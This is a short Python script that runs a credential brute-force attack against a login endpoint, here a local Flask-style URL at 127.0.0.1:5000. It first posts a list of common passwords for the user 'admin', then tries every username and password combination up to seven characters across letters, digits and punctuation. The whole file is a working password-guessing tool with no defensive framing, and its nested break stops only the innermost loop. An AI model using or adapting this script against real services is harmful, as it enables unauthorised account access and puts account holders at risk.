import requests
import itertools
import string

# Add uppercase letters and special characters to the mix
CHAR_SET = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation

url = 'http://127.0.0.1:5000/login'


def attempt_login(username, password):
    payload = {'username': username, 'password': password}
    response = requests.post(url, data=payload)
    return response.status_code == 200


# Use common password patterns or read from a list of common passwords
common_passwords = ['password', '123456', '123456789', 'qwerty', 'abc123', 'password1', '!@#$%^&*']
for password in common_passwords:
    if attempt_login('admin', password):
        print(f"Success! Username: 'admin', Password: {password}")
        break

# For a more comprehensive attack, attempt different lengths and use the extended character set
for username_length in range(1, 8):  # adjust if needed
    for password_length in range(1, 8):
        for username in itertools.product(CHAR_SET, repeat=username_length):
            for password in itertools.product(CHAR_SET, repeat=password_length):
                username_str = ''.join(username)
                password_str = ''.join(password)

                if attempt_login(username_str, password_str):
                    print(f"Success! Username: {username_str}, Password: {password_str}")
                    break